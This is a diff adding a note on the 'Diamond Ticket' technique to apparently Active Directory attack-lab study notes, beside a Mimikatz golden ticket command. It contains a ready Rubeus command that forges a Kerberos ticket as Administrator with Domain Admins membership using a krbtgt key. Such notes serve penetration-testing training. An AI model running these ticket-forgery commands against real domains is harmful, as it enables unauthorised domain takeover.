@@ -841,6 +841,11 @@ Invoke-Mimikatz -Command '"kerberos::golden /user:DCORP-DC$ /domain:dollarcorp.m
 >
 > S-1-5-9 - Enterprise Domain Controllers
 
+It can also bee possible with a `Diamond Ticket` and rubeus.
+
+```
+.\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /tickeruserid:500 /groups:512 /sids:S-1-5-21-560323961-2032768757-2425134131-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa  /nowrap
+```
 
 ## SID Filtering (Defending)
 
